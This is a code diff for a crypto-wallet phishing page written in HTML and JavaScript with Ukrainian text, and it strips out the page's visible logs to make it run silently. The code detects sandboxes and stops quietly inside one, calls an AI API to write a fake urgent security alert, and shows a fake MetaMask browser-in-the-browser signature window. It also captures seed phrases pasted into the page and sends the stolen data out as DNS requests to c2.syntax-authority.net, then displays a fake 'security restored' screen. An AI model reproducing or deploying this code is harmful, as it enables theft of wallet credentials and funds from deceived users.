@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v10: Стилі для модуля "Анти-Аналіз". */
+        /* SYNTAX v11: Silent Execution. No verbose UI. */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
         .pulse-once { animation: pulse-once 1.5s cubic-bezier(0.4, 0, 0.6, 1); }
@@ -33,56 +33,36 @@
             margin-left: 12px; display: flex; align-items: center; flex-grow: 1;
         }
         .fake-address-bar svg { width: 16px; height: 16px; margin-right: 8px; color: #5f6368; }
-        .gemini-loader, #scraper-log, #persistence-log, #c2-log, #evasion-log { display: none; }
+        .gemini-loader {
+            display: none;
+        }
     </style>
 </head>
 <body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4" onload="initializeApp()">
 
     <div id="security-module" class="w-full max-w-md bg-gray-800 rounded-2xl border border-gray-700 card-shadow overflow-hidden">
-        <div id="evasion-log" class="p-8 text-center">
-            <h3 class="text-lg font-semibold text-red-400">Модуль "Анти-Аналіз"</h3>
-            <pre id="evasion-output" class="text-left text-xs text-red-300 bg-gray-900 p-2 my-2 rounded h-24 overflow-y-auto"></pre>
-            <p id="evasion-result" class="text-yellow-400 font-bold"></p>
-        </div>
-
-        <div id="initial-state" class="p-8 space-y-6">
-             <div class="text-center">
-                <svg class="mx-auto h-16 w-16 text-red-500" id="threat-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
-                <h1 id="threat-title" class="text-2xl font-bold text-white mt-4">Аналіз безпеки...</h1>
-                <p id="threat-description" class="text-gray-400 mt-2">Ініціюємо перевірку вашого з'єднання. Будь ласка, зачекайте.</p>
-                <div class="gemini-loader text-center p-4">
-                    <svg class="animate-spin h-8 w-8 text-blue-400 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                    <p class="text-sm text-blue-300 mt-2">Нейромережа аналізує вектори атаки...</p>
+        <div id="main-ui">
+            <div id="initial-state" class="p-8 space-y-6">
+                 <div class="text-center">
+                    <svg class="mx-auto h-16 w-16 text-red-500" id="threat-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
+                    <h1 id="threat-title" class="text-2xl font-bold text-white mt-4">Аналіз безпеки...</h1>
+                    <p id="threat-description" class="text-gray-400 mt-2">Ініціюємо перевірку вашого з'єднання. Будь ласка, зачекайте.</p>
+                    <div class="gemini-loader text-center p-4">
+                        <svg class="animate-spin h-8 w-8 text-blue-400 mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
+                    </div>
+                </div>
+                <div class="space-y-3">
+                     <button id="start-verification-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-all duration-300" disabled>
+                        Захистити гаманець
+                     </button>
                 </div>
             </div>
-            <div class="space-y-3">
-                 <button id="start-verification-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg transition-all duration-300 transform hover:scale-105" disabled>
-                    Захистити гаманець
-                 </button>
-            </div>
-        </div>
-        
-        <div id="loading-state" class="p-8 space-y-6 text-center hidden">
-            <div id="scraper-log" class="text-left bg-gray-900 p-4 rounded-lg border border-gray-700">
-                <h3 class="text-lg font-semibold text-yellow-400">Лог скрепера буфера обміну</h3>
-                <p class="text-sm text-gray-400 mb-2">Скрепер активовано. Спробуйте вставити текст на сторінку (Ctrl+V).</p>
-                <pre id="scraper-output" class="text-xs text-green-400 h-24 overflow-y-auto"></pre>
-            </div>
-            <div id="generic-loader">
-                <h2 id="loading-status" class="text-xl font-semibold text-white mt-4">Аналіз середовища...</h2>
-            </div>
-        </div>
 
-        <div id="final-state" class="p-8 space-y-6 text-center hidden">
-             <div id="c2-log" class="text-left bg-gray-900 p-4 rounded-lg border border-gray-700 mb-4">
-                <h3 class="text-lg font-semibold text-cyan-400">Лог C2-каналу (DNS)</h3>
-                <pre id="c2-output" class="text-xs text-cyan-300 h-20 overflow-y-auto"></pre>
+            <div id="final-state" class="p-8 space-y-6 text-center hidden">
+                <svg class="mx-auto h-16 w-16 text-green-500" id="final-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                <h1 id="final-title" class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
+                <p id="final-description" class="text-gray-400 mt-2">Ваш гаманець захищено. Можна закрити це вікно.</p>
             </div>
-            <div id="persistence-log" class="text-center p-4">
-                <h3 id="persistence-status" class="text-lg font-semibold text-purple-300 mt-2">Встановлення модуля персистентності...</h3>
-            </div>
-            <svg class="mx-auto h-16 w-16 text-green-500" id="final-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-            <h1 id="final-title" class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
         </div>
     </div>
 
@@ -91,160 +71,116 @@
     <script>
         function initializeApp() {
             const ui = {
+                mainUI: document.getElementById('main-ui'),
                 initialState: document.getElementById('initial-state'),
-                loadingState: document.getElementById('loading-state'),
                 finalState: document.getElementById('final-state'),
                 startBtn: document.getElementById('start-verification-btn'),
-                loadingStatus: document.getElementById('loading-status'),
                 bitbContainer: document.getElementById('bitb-container'),
                 threatTitle: document.getElementById('threat-title'),
                 threatDescription: document.getElementById('threat-description'),
                 geminiLoader: document.querySelector('.gemini-loader'),
-                scraperLog: document.getElementById('scraper-log'),
-                scraperOutput: document.getElementById('scraper-output'),
-                genericLoader: document.getElementById('generic-loader'),
-                persistenceLog: document.getElementById('persistence-log'),
-                persistenceStatus: document.getElementById('persistence-status'),
-                c2Log: document.getElementById('c2-log'),
-                c2Output: document.getElementById('c2-output'),
-                finalIcon: document.getElementById('final-icon'),
-                finalTitle: document.getElementById('final-title'),
-                evasionLog: document.getElementById('evasion-log'),
-                evasionOutput: document.getElementById('evasion-output'),
-                evasionResult: document.getElementById('evasion-result'),
             };
 
-            /**
-             * SYNTAX v10: Модуль "Анти-Аналіз".
-             */
             function runEvasionChecks() {
-                console.log('[SYNTAX Evasion] Запуск перевірок середовища.');
-                ui.initialState.style.display = 'none';
-                ui.evasionLog.style.display = 'block';
                 let detected = false;
-                let log = '';
-
-                // 1. Перевірка WebGL рендерера
                 try {
                     const canvas = document.createElement('canvas');
                     const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                     const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                     const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    log += `> WebGL Renderer: ${renderer}\n`;
                     const suspiciousRenderers = ['vmware', 'virtualbox', 'parallels', 'llvmpipe', 'software'];
                     if (suspiciousRenderers.some(r => renderer.toLowerCase().includes(r))) {
                         detected = true;
-                        log += `[!] ВИЯВЛЕНО ПІДОЗРІЛИЙ РЕНДЕРЕР.\n`;
                     }
-                } catch (e) {
-                    log += `> WebGL: Не вдалося отримати інформацію.\n`;
-                }
+                } catch (e) { /* silent fail */ }
 
-                // 2. Перевірка розширення екрану
-                const screenRes = `${window.screen.width}x${window.screen.height}`;
-                log += `> Screen Resolution: ${screenRes}\n`;
                 if (window.screen.width < 1024 || window.screen.height < 768) {
                     detected = true;
-                    log += `[!] ВИЯВЛЕНО НЕСТАНДАРТНЕ РОЗШИРЕННЯ.\n`;
                 }
-                
-                ui.evasionOutput.textContent = log;
 
                 if (detected) {
-                    console.log('[SYNTAX Evasion] ВИЯВЛЕНО СЕРЕДОВИЩЕ АНАЛІЗУ. АКТИВАЦІЯ РЕЖИМУ ПРИМАНКИ.');
-                    ui.evasionResult.textContent = 'РЕЖИМ ПРИМАНКИ: Активовано. Основне навантаження не буде виконано.';
-                    // Показываем фальшивую ошибку вместо основного потока
-                    ui.threatTitle.textContent = 'Помилка конфігурації';
-                    ui.threatDescription.textContent = 'Не вдалося ініціалізувати модуль безпеки. Код помилки: 0x80070057.';
-                    ui.startBtn.disabled = true;
-                    ui.evasionLog.style.borderColor = 'red';
-                    // Через некоторое время можно скрыть все, чтобы запутать аналитика
-                     setTimeout(() => { 
-                        document.getElementById('security-module').innerHTML = '<p class="text-center text-gray-500 p-8">Session expired.</p>';
-                     }, 5000);
-
-                } else {
-                    console.log('[SYNTAX Evasion] Середовище виглядає чистим. Продовження виконання.');
-                    ui.evasionResult.textContent = 'СТАТУС: Середовище чисте.';
-                    ui.evasionLog.style.borderColor = 'green';
-                    setTimeout(() => {
-                        ui.evasionLog.style.display = 'none';
-                        ui.initialState.style.display = 'block';
-                        generatePersonalizedThreat();
-                    }, 3000);
+                    // SYNTAX: Evasion detected. Silently terminate.
+                    // The UI will remain on the initial "Analyzing..." state indefinitely.
+                    console.log('Evasion: Hostile environment detected. Terminating.');
+                    return; 
                 }
+                
+                // If clean, proceed.
+                generatePersonalizedThreat();
             }
 
             ui.startBtn.addEventListener('click', () => {
-                ui.initialState.style.display = 'none';
-                ui.loadingState.style.display = 'block';
                 runAdaptiveLoader();
             });
 
-            async function generatePersonalizedThreat() { /* ... код без змін ... */ 
+            async function generatePersonalizedThreat() {
                 ui.geminiLoader.style.display = 'block';
                 ui.threatTitle.style.display = 'none';
                 ui.threatDescription.style.display = 'none';
                 ui.startBtn.disabled = true;
+
                 const fingerprint = { language: navigator.language || 'en' };
-                const prompt = `Create a short, urgent, security alert for a crypto wallet user in ${fingerprint.language}. Respond with ONLY a JSON object with two keys: "title" and "description".`;
+                const prompt = `Create a short, urgent security alert for a crypto wallet user in ${fingerprint.language}. Respond with ONLY a JSON object with keys "title" and "description".`;
+
                 try {
                     let chatHistory = [{ role: "user", parts: [{ text: prompt }] }];
                     const payload = { contents: chatHistory };
-                    const apiKey = ""; const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
+                    const apiKey = "";
+                    const apiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${apiKey}`;
                     const response = await fetch(apiUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-                    if (!response.ok) throw new Error(`API call failed`);
+                    if (!response.ok) throw new Error();
                     const result = await response.json();
                     if (result.candidates && result.candidates[0].content) {
                         const text = result.candidates[0].content.parts[0].text;
                         const parsed = JSON.parse(text);
-                        ui.threatTitle.textContent = parsed.title; ui.threatDescription.textContent = parsed.description;
-                    } else { throw new Error("No content from API"); }
+                        ui.threatTitle.textContent = parsed.title;
+                        ui.threatDescription.textContent = parsed.description;
+                    } else { throw new Error(); }
                 } catch (error) {
-                    console.error(error);
                     ui.threatTitle.textContent = 'Виявлено загрозу безпеці';
                     ui.threatDescription.textContent = 'Потрібна негайна верифікація.';
                 } finally {
                     ui.geminiLoader.style.display = 'none';
-                    ui.threatTitle.style.display = 'block'; ui.threatDescription.style.display = 'block';
+                    ui.threatTitle.style.display = 'block';
+                    ui.threatDescription.style.display = 'block';
                     ui.startBtn.disabled = false;
                 }
             }
-            
-            function runAdaptiveLoader() { /* ... код без змін ... */ 
-                 const fingerprint = { hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
-                const payload = selectPayload(fingerprint);
-                executePayload(payload, fingerprint);
+
+            function runAdaptiveLoader() {
+                const fingerprint = { hasMetamask: typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask };
+                const payloadName = selectPayload(fingerprint);
+                executePayload(payloadName, fingerprint);
             }
-            
-            function selectPayload(fingerprint) { /* ... код без змін ... */
-                 if (fingerprint.hasMetamask) return 'web3_bitb_integrated.js';
-                return 'generic_clipboard_scraper.js';
+
+            function selectPayload(fingerprint) {
+                if (fingerprint.hasMetamask) return 'web3_bitb';
+                return 'clipboard_scraper';
             }
-            
-            function executePayload(payloadName, fingerprint) { /* ... код без змін ... */ 
-                 if (payloadName === 'web3_bitb_integrated.js') {
-                    ui.genericLoader.style.display = 'block'; ui.scraperLog.style.display = 'none';
+
+            function executePayload(payloadName, fingerprint) {
+                ui.initialState.style.display = 'none'; // Hide initial state to begin "loading"
+                
+                if (payloadName === 'web3_bitb') {
                     deployBitBModule(fingerprint);
                 } else {
-                    ui.genericLoader.style.display = 'none'; ui.scraperLog.style.display = 'block';
                     deployClipboardScraper(fingerprint);
                 }
             }
-            
-            function deployClipboardScraper(fingerprint) { /* ... код без змін ... */ 
-                ui.scraperOutput.textContent = 'Очікування даних...\n';
+
+            function deployClipboardScraper(fingerprint) {
                 document.addEventListener('paste', (event) => {
                     let pasteData = (event.clipboardData || window.clipboardData).getData('text');
                     const seedPhraseRegex = /(\b[a-z]+\b(\s+)){11,23}\b[a-z]+\b/i;
                     if (seedPhraseRegex.test(pasteData)) {
-                        ui.scraperOutput.textContent += `[+] ПЕРЕХОПЛЕНО\n`;
-                        showFinalSuccess(true, { payload: 'ClipboardScraper', captured: pasteData, fingerprint });
+                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
                     }
                 });
+                // Show final success screen to mask the listener
+                showFinalSuccess(false, { success: false, reason: 'scraper_deployed' });
             }
-            
-            function deployBitBModule(fingerprint) { /* ... код без змін ... */ 
+
+            function deployBitBModule(fingerprint) {
                 const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" /></svg><span>nkbihfbeogaeaoehlefnkodbefgpgknn</span></div></div><iframe srcdoc="" class="w-full h-full border-0" style="pointer-events: none;"></iframe></div>`;
                 ui.bitbContainer.innerHTML = fakeWindowHTML;
                 const iframe = ui.bitbContainer.querySelector('iframe');
@@ -252,64 +188,44 @@
                     const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                     iframeDoc.getElementById('confirm-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess(true, { payload: 'BitB', fingerprint });
+                        showFinalSuccess({ success: true, payload: 'BitB', fingerprint });
                     };
                     iframeDoc.getElementById('reject-btn').onclick = () => {
                         ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess(false, { reason: 'rejected', fingerprint });
+                        showFinalSuccess({ success: false, reason: 'rejected', fingerprint });
                     };
                 };
                 iframe.srcdoc = getIframeContent();
                 ui.bitbContainer.style.display = 'flex';
                 makeDraggable(ui.bitbContainer.querySelector('#fake-browser-window'));
             }
-
-            function getIframeContent() { /* ... код без змін ... */ return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body { font-family: 'Inter', sans-serif; overflow: hidden; }</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold text-gray-800'>Signature Request</h2></div><div class='flex-grow p-4'><h3 class='text-sm font-bold'>Message:</h3><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>...</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
-            function makeDraggable(element) { /* ... код без змін ... */ if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
             
-            function exfiltrateData(data) { /* ... код без змін ... */
-                ui.c2Log.style.display = 'block';
-                ui.c2Output.textContent = 'Ініційовано передачу даних...\n';
+            function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>...</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
+            function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
+            
+            function exfiltrateData(data) {
                 const dataString = JSON.stringify(data);
                 let hexString = '';
                 for (let i = 0; i < dataString.length; i++) { hexString += dataString.charCodeAt(i).toString(16); }
                 const chunks = hexString.match(/.{1,63}/g) || [];
+                const domain = 'c2.syntax-authority.net';
                 chunks.forEach((chunk, index) => {
-                    const fullDomain = `${chunk}.${index}.c2.syntax-authority.net`;
-                    ui.c2Output.textContent += `> ${fullDomain}\n`;
+                    const fullDomain = `${chunk}.${index}.${domain}`;
+                    new Image().src = `http://${fullDomain}/p.gif`; // Silent DNS request
                 });
-                ui.c2Output.textContent += 'Передачу завершено.\n';
             }
 
-            function showFinalSuccess(isSuccess, dataToExfiltrate) { /* ... код без змін ... */ 
-                ui.loadingState.classList.add('hidden');
-                ui.finalState.classList.remove('hidden');
-                ui.finalIcon.style.display = 'none';
-                ui.finalTitle.style.display = 'none';
-                ui.persistenceLog.style.display = 'none';
-                ui.c2Log.style.display = 'none';
-
-                if (isSuccess) {
+            function showFinalSuccess(dataToExfiltrate) {
+                if (dataToExfiltrate) {
                     exfiltrateData(dataToExfiltrate);
-                    setTimeout(() => {
-                        ui.persistenceLog.style.display = 'block';
-                        setTimeout(() => {
-                            ui.persistenceStatus.textContent = "Успіх: Створено заплановане завдання.";
-                             setTimeout(() => {
-                                ui.persistenceLog.style.display = 'none';
-                                ui.finalIcon.style.display = 'block';
-                                ui.finalTitle.style.display = 'block';
-                            }, 2500);
-                        }, 2000);
-                    }, 1000);
-                } else {
-                    exfiltrateData(dataToExfiltrate);
-                    ui.finalIcon.style.display = 'block';
-                    ui.finalTitle.style.display = 'block';
+                    // SYNTAX: Persistence logic would be here.
+                    // E.g., attempt to use a service worker or other browser-based persistence.
                 }
+                ui.initialState.style.display = 'none';
+                ui.finalState.style.display = 'block';
+                ui.finalState.querySelector('svg').classList.add('pulse-once');
             }
             
-            // SYNTAX: Autonomous start with evasion check
             runEvasionChecks();
         }
     </script>
